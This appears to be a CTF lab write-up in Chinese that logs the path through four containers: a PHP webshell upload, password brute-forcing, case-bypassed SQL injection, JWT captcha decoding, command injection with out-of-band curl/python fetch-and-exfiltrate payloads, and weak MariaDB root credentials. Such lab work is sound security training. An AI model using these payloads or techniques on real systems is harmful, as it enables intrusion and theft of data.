# b-03 · 探索记录

对应题解：[`b-03.md`](./b-03.md)。四台机器、四个 flag，入口是「官网 + 上传点」。

## 目标与起点

题目原文只说「官网存在漏洞，从外网进入内网拿核心数据」。入口一个 `IP:80`，PHP 站点。

## 第一阶段：入口枚举

### 首页

导航里直接有「后台登录」→ `/admin/login.php`，比 b-01/b-02 直白。`about.php`、`news.php`、`contact.php` 都正常。

`news.php?id=N` 试了 `0`/`1`/`'`/`1 and 1=1`/`1 union select 1`——**响应长度恒定 3139**，没有注入，很快排除。

### 目录

ffuf 跑了两万条，真实存在的只有：

```
admin/           → 403（目录索引禁用）
admin/login.php
admin/upload.php → 未登录 302 到登录页
uploads/         → 403
```

`admin/` 的 403 和 `uploads/` 的 403 都说明目录存在。`admin/upload.php` 是唯一一个「未登录会跳走」的页面——**它的存在本身就是目标**。

对 `admin/` 又跑了一轮 6 万条字典，除了 `upload.php`、`dashboard.php`、`logout.php`、`auth.php` 之外没有新东西（`auth.php` 直接访问会被 `IN_ADMIN` 常量挡住）。

### 登录：先错后对

`/admin/login.php` 的表单只有用户名/密码。按 b-01/b-02 的经验先试：

```
admin:admin / admin:123456 / admin:password / admin:ruian / admin:ruian123 /
admin:Ruian@2024 / admin:admin123 / administrator:admin
```

全部「用户名或密码错误」。SQLi 也试了：`admin'-- -`、`' or 1=1-- -`、`admin' or '1'='1`、`' or '1'='1'#`、`admin'#`——**全部同样的报错**，没有任何 SQL 特征。

后来读到源码（拿到 shell 后）才知道，这题的鉴权是硬编码数组：

```php
define('USERS', [
    'admin'  => ['password' => 'Admin@123', 'role' => 'admin'],
    'editor' => ['password' => 'a1111111', 'role' => 'editor'],
]);
if (isset($users[$username]) && $users[$username]['password'] === $password)
```

**没有任何数据库查询，所以 SQLi 必然没有反应。** 这一支应该更早放弃——「所有注入 payload 得到逐字节相同的响应」就是「这里没有 SQL」的信号，不要因为「登录框」这个形状就假定一定有注入。

之后用本地字典（约 4900 条）批量跑 `admin`，第 196 次命中：

```
FOUND admin Admin@123 302
```

### 顺手试的两个小技巧

- **数组参数**：`password[]=x`、`username[]=admin`。PHP 8 之前 `strcmp(array, string)` 可能返回 0 绕过，但这里是严格的 `===`，所以只得到一个 warning，没有效果。
- **响应时间**：20 次错误登录 1.9 秒，说明没有失败锁定，也没有人为延迟，可以放心爆破。

## 第二阶段：上传点（最便宜的一步）

登录后 `/admin/dashboard.php` 有「文件上传」入口，`/admin/upload.php` 表单：

```html
<input type="file" name="attachment" required
       accept=".jpg,.jpeg,.png,.gif,.pdf,.doc,.docx">
```

页面文字写「允许的类型：图片、文档，最大 5MB」。

先按最保守的方式试了一个 `.php`，Content-Type 伪造为 `image/png`：

```bash
printf '<?php echo "UP:"; system($_GET["c"]); ?>' > shell.php
curl -b cj -c cj \
  -F "csrf_token=$TOK" \
  -F "attachment=@shell.php;type=image/png;filename=shell.php" \
  http://$T/admin/upload.php
# ✅ 文件上传成功！路径：/uploads/shell.php
```

**一次成功**。请求 `/uploads/shell.php?c=id` 直接执行，读 `/challenge/flag1.txt` 拿到第一面（`matched_flag_index: 0`）。

拿到 shell 后才回头看源码，确认了黑名单：

```php
$blocked_exts = ['exe','bat','cmd','sh','cgi'];        // 没有 php
$allowed_types = [..., 'application/x-php','text/x-php','text/plain'];
```

- 后缀黑名单**只列了可执行文件，漏了 `php`**。
- Content-Type 白名单里**主动包含了 PHP 类型**，而且这个值完全由客户端提供。

这里值得记的是：**`accept` 属性只是浏览器过滤，不是服务端校验**；真正决定成败的是黑名单里有没有你用的后缀。

## 第三阶段：内网拓扑

从 web 容器扫同网段：

```
172.19.0.1:22
172.19.0.1:8080
172.19.0.2:8080     ← OA
172.19.0.3:80       ← 自己
172.19.0.4:3306     ← MariaDB
172.19.0.4:6379     ← Redis
```

`.4` 上同时有 MySQL 和 Redis，`.2` 是 OA（gunicorn）。

**注意**：本机（macOS）能直连 `172.19.0.4:3306` 和 `:6379`，这是本题的特殊之处——内网库对外也通了，不用非得从容器里打。

## 第四阶段：OA（flag2 + flag3）

### 验证码：不要 OCR，去读 cookie

OA 登录页有 4 位数字验证码。先试了常规思路：

- 看图识码：可以，但每次登录都要人工读一次，爆破时不可行。
- 试 `tesseract`：没装。

抓包时注意到 `/captcha.png` 的响应：

```
Set-Cookie: session=eyJjYXB0Y2hhIjoiOTY3NyJ9.at8ncQ.SMkho2wuUeaXpXMB3EGjMYQ9j4
```

第一段 Base64URL 解码就是 `{"captcha":"9677"}`。**JWT 只签名不加密**，验证码就在明文中。于是完全不需要看图：

```python
p = jwt.split('.')[0]; p += '=' * (-len(p) % 4)
json.loads(base64.urlsafe_b64decode(p))   # {'captcha': '9677'}
```

### 一个反复踩的坑：session 轮换

第一版脚本把验证码和 cookie 一起提交，结果一直是「验证码错误」。debug 后才发现两个问题：

1. **PHP curl 的 cookie jar 没写盘**：只设了 `COOKIEFILE` 没设 `COOKIEJAR`，`/tmp/*.jar` 是空的，拿不到 JWT。
2. **Flask 在 POST 后会轮换 session**：登录成功/失败都会下发新的 `session` cookie，如果还用旧 cookie 去推理「验证码是否被清掉」，读到的就是过期状态。

正确的流程是：GET `/captcha.png` → 从响应头 `Set-Cookie` 取 JWT → 解出验证码 → POST `/login` 带同一个 `session` → 从 POST 的响应头取新 session。用 `curl -D` 拿响应头比用 cookie jar 可靠。

### 爆破：先错口令，再命中

OA 账号先试了 web 后台的 `admin:Admin@123` 和 `editor:a1111111`——失败（两套系统口令不同）。然后用同一份字典跑 `admin,editor`，命中：

```
FOUND admin:1qaz@WSX
```

`1qaz@WSX` 是键盘列组合，和 b-02 的核心系统 `sysadmin` 口令是同一个形状。

### flag2：管理后台页面

登录后 `/admin` 直接渲染「管理员机密信息」：

```
flag{201a62ef-...}
内网核心服务器: 192.168.20.30 (Redis:6379 / MySQL:3306)
```

**flag2 到手**（`matched_flag_index: 1`）。同一页还给了内网库的地址，是下一跳的指引。

### 顺手：`/api/employees` 的 SQL 注入

OA 的「员工查询」是前端 `fetch('/api/employees?name=')`。

```bash
name='
# {"error":"unrecognized token: \"'\""}   → 报错暴露了 SQLite
```

然后：

| payload | 结果 |
| --- | --- |
| `' UNION SELECT 1,2,3,4,5-- -` | `检测到危险关键字: UNION` |
| `' union select 1,2,3,4,5-- -` | **成功**，5 个回显位 |
| `' UnIoN SeLeCt ...` | 同样成功 |

**关键字匹配区分大小写**，小写直接绕过。从 `sqlite_master` 拿到三张表（`employees`/`users`/`admin_secrets`），从 `users` 拿到 admin 的 SHA-256（碰出 `1qaz@WSX`），从 `admin_secrets` 拿到提示：

```
admin_password_hint = 该密码为键盘组合弱口令，格式: 键盘列+特殊字符+键盘列
internal_network    = 192.168.20.0/24
db_server           = 192.168.20.30 - Redis:6379 / MySQL:3306
```

这一支没有直接给 flag，但**解释了 `1qaz@WSX` 的来源**，也印证了下一跳的地址。注意 SQL 里 `value` 这个词会被上层过滤替换掉，`group_concat(hex(value))` 一度失败，换列名或加注释才能取到。

### flag3：命令注入 + 带外回连

`/admin/system` 是「网络诊断」，`target` 拼进 shell：

```
/bin/sh -c "ping -c 1 " + target
```

过滤挡 `;`、`|`、`&`、`>`、`<`，**不挡 `$()`**。

但这次 `ping` 在容器里没有权限：

```
/bin/sh: 1: ping: Operation not permitted
```

所以**盲打没有回显**，必须先确认命令是否执行。做法是让目标反连 web 容器（`172.19.0.3`），由 web 容器收结果。

这一段花的时间最长，记录一下试错顺序：

| 尝试 | 结果 | 结论 |
| --- | --- | --- |
| `target=127.0.0.1; id` | `安全检测: 发现危险字符 ";"` | 分号被拦 |
| `target=127.0.0.1\|id` | `安全检测: 发现危险字符 "|"` | 单竖线被拦 |
| `target=127.0.0.1 && id` | `安全检测: 发现危险字符 "&"` | 与号被拦 |
| `target=$(id)` | `ping: Operation not permitted` | **`$()` 通过，但 ping 没权限** |
| `target=$(curl ...)` | 无回显 | 命令执行了，但结果没地方去 |
| `target=$(bash -c "exec 3<>/dev/tcp/...")` | 无 | 容器里的 `/bin/sh` 是 dash，不支持 `/dev/tcp` |
| `target=$(curl -s http://attacker/x)` | **接收端收到请求** | curl、wget、python3 都在 |

确认能出网之后，把「取脚本 + 执行 + base64 回传」压成一条 payload，避免触发输入长度限制（超长会返回「输入过长」）：

```
$(sh -c "$(curl -s http://172.19.0.3:9000/s)")
```

- `9000`：web 容器上的一个 PHP 小服务，把 `/tmp/oa_srv.sh` 当 HTTP 响应返回。
- `9001`：另一个 PHP 小服务，把请求行里的 `?d=` 写进文件。
- `oa_srv.sh` 的内容固定是「执行 + base64 + 回连」。

读 `/challenge/flag3.txt` 得到 **flag3**（`matched_flag_index: 2`）。

### 顺手：源码里其实写清了每一面

拿 OA 的 shell 之后读了 `/app/src/app.py`，文件头注释直接写着：

```
Flag2 在 admin 后台页面渲染（不在数据库里）
Flag3 = 命令注入 RCE
```

以及 `/app/data/.flask_secret`（Flask 签名密钥）。**这题的注释就是官方提示**，先读源码能省掉一半摸索。

## 第五阶段：内网 MariaDB（flag4）

### 客户端问题

本机没有 `mysql`/`mariadb`/`redis-cli`；远端容器里也没有。装了 `pymysql` 之后连接失败：

```
OperationalError (2013, 'Lost connection to MySQL server during query')
```

MariaDB 5.5.5-10.11 的握手在这条链路上不兼容（服务端要求 `mysql_native_password` 的 auth switch，pymysql 版本没走通）。于是手写了一个最小 MySQL 客户端：

1. 读握手包，解析 `scramble`、能力位、认证插件。
2. 发 `HandshakeResponse41`，带 `CLIENT_PROTOCOL_41 | CLIENT_SECURE_CONNECTION | CLIENT_PLUGIN_AUTH`。
3. 服务端回 `0xfe`（auth switch）时，按新的 `scramble` 重算 `native_password`，**再发一次**认证包。
4. 之后解析 `query` 的列定义 / EOF / 行包。

中间踩的坑：第一次 `client_caps` 里漏了 `0x200`（`CLIENT_PROTOCOL_41`），服务端直接把连接掐掉；补上之后又在「第二次认证包」的序列号上算错，读包时错位。**协议 bug 的判据是「服务端在第几个包之后不再回应」，不是错误码。**

### 口令与结果

Redis 开了 `requirepass`，试了十几个候选都 `AUTH failed`（后来也没继续）。MySQL 直接命中：

```
root:root
```

dump 出 `corporate` 库：

```
audit_log       4 行操作日志
internal_config oa/web/redis 地址
secrets         4 行，含 corporate_secret = flag4
```

**flag4 到手**（`matched_flag_index: 3`），四题全部完成。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `news.php?id=` 注入 | 无 | 响应长度恒定 3139 |
| web 后台 SQLi | 无 | 硬编码 `USERS` 数组，没有 SQL；所有 payload 报错一致 |
| web 后台数组参数绕过 | 无 | `===` 严格比较 |
| `admin/` 六万条字典 | 无新文件 | 只有 upload/dashboard/logout/auth |
| 上传 `.php` 被拦 | **没被拦** | 黑名单漏 php，一次成功 |
| 验证码 OCR | 不必要 | JWT payload 明文 |
| cookie jar 读验证码 | 失败 | 只设 `COOKIEFILE` 未设 `COOKIEJAR` |
| 同一 cookie 复用验证码 | 失败 | Flask POST 后轮换 session |
| `;` / `\|` / `&&` 注入 | 被拦 | 关键字过滤，逐条报出被拦字符 |
| `/dev/tcp` 反连 | 无 | 容器 `/bin/sh` 是 dash |
| 长 payload 直接执行 | `输入过长` | 有长度上限，改带外加载 |
| Redis 弱口令 | 未成功 | `NOAUTH`，候选未命中 |
| `pymysql` 连 MariaDB | `2013 Lost connection` | 握手/auth switch 不兼容，改手写协议 |

## 这次真正的收获

1. **上传点先看服务端黑名单缺什么**：`accept` 是浏览器过滤，`Content-Type` 是客户端自报，只有后缀黑名单是真的。
2. **签名 cookie 不是密文**：JWT 的 payload 是 Base64URL 明文，验证码、角色这类字段先解一遍再决定要不要伪造。
3. **注意 session 轮换**：Flask/PHP 都可能在响应里换 cookie，抓包看 `Set-Cookie` 比 cookie jar 可靠。
4. **关键字 WAF 常常区分大小写**：大写被拦先试小写，再考虑注释和编码。
5. **「没有回显」要先分类**：没执行 / 执行了但输出丢失 / 执行了但没权限。本例是第三种（`ping` 无权限），所以换带外通道，而不是放弃注入。
6. **输入有长度上限时，把脚本放带外**：payload 只留「取脚本 + 执行」十几个字符。
7. **弱口令优先于复杂利用**：最后的 MariaDB `root:root` 是最便宜的一步，但需要前面拿到容器执行权限才够得着。

---

## 补充：2026-10-27 本轮自主探索的失败路径

### 1. 方法不对：POST 打到 `/` 拿到 405，误判成凭据错

OA 的登录入口是 `POST /login`，根路径只接受 GET。

| 尝试 | 结果 | 判据 |
| --- | --- | --- |
| `POST /` + `username/password` | `405 METHOD NOT ALLOWED` | 方法与路径不匹配，与凭据无关 |
| `GET /` | 200，登录页 | |
| `POST /login` + `1qaz@WSX` | 302 → 登录成功 | |

**该早做的事**：看到 405 先查方法/路径，不要当成「口令不对」再去换口令。
这一条本可以省掉一轮误判。

### 2. 后台路径猜错

| 路径 | 结果 | 判据 |
| --- | --- | --- |
| `/admin`、`/dashboard.php`、`/challenge/flag2.txt`（在 web 容器上） | 302 / 404 | 这些是 OA 的路径，不在 web 容器 |
| `/index.php`、`/main.php`、`/home.php`（在 OA 上） | 404 | OA 首页就是 `/` |
| `/admin/system`（GET） | 302 回 `/login` | 需要会话 |
| `/admin/system`（POST + csrf） | 200 | |

**判据**：两台机器上都有 `/admin`，但语义完全不同。跨机器猜路径之前先确认这是哪一台。

### 3. 验证码：读了四次图才想到解 cookie

| 尝试 | 结果 | 判据 |
| --- | --- | --- |
| 不带 captcha 直接 POST | `验证码错误` | |
| 复用上一次的 captcha | 失败 | Flask 登录成功后轮换 session |
| `GET /captcha.png` 存图人工识别（4 次） | 通过 | 4 位数字 |
| 解 `session` cookie 的 payload | 直接得到 `{"captcha":"0609"}` | 签名 cookie 的 payload 是 Base64URL 明文 |

**该早做的事**：看到 Flask 签名 cookie，先解 payload 再考虑 OCR。验证码这种字段几乎总会
出现在 payload 里。

### 4. 命令注入：注入了，但没有输出通道

`/admin/system` 的 `target` 拼进 `ping`。

| payload | 结果 | 判据 |
| --- | --- | --- |
| `127.0.0.1$(id)` | `/bin/sh: 1: ping: Operation not permitted` | **命令执行了**，是 ping 自己没权限 |
| `127.0.0.1$(base64</challenge/flag3.txt)` | `安全检测: 发现危险字符 <` | 重定向符被拦 |
| `$(python3 -c "…urlopen('http://172.18.0.3:9001/'+b64).read()")` | 成功 | 只剩 `$()` 可用，用 `read()` 不落盘 |

关键区分：`Operation not permitted` 是 `ping` 的报错，不是 shell 的。它说明
**注入成功、执行成功，只是包装命令本身跑不了**，所以只能走带外，不能等页面回显。

### 5. 等待回显的两次空转

| 尝试 | 结果 | 判据 |
| --- | --- | --- |
| 直接在页面里等 `ping` 输出 | 只有 `Operation not permitted` | ping 不可执行，永远不会有输出 |
| 先试 `cat` 之类的短命令 | 被 `安全检测` 拦 | 黑名单 |

### 6. 带外监听的两次失败

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| 监听进程没起来 | 前台启动，请求返回后随 PHP 进程退出 | `setsid php lis.php >/dev/null 2>&1 &` + `sleep 1` |
| 不确定是否在听 | 没验证就发 payload | `ss -ltn \| grep 9001` 看到 `LISTEN 0.0.0.0:9001` 再发 |

### 7. 内网地址与本轮实例不一致

旧记录里核心库在 `172.18.0.3:3306`，本轮是 `172.18.0.4:3306`。

| 尝试 | 结果 | 判据 |
| --- | --- | --- |
| 按旧记录的 `172.18.0.3:3306` | `TimeoutError: timed out` | 该地址上本轮没有服务 |
| 从容器扫 `172.18.0.4:3306` | open | |

**判据**：`connect` 超时无法区分「服务没开」和「地址错了」，必须先从容器里扫一遍。

### 8. 手写 MySQL 协议（同 b-02）

`AUTHFAIL code=254`（没处理 `AuthSwitchRequest`）→ 补 0xFE 分支；
`3D000 No database selected`（握手未带 `CLIENT_CONNECT_WITH_DB`）→ 用 `corporate.secrets`。
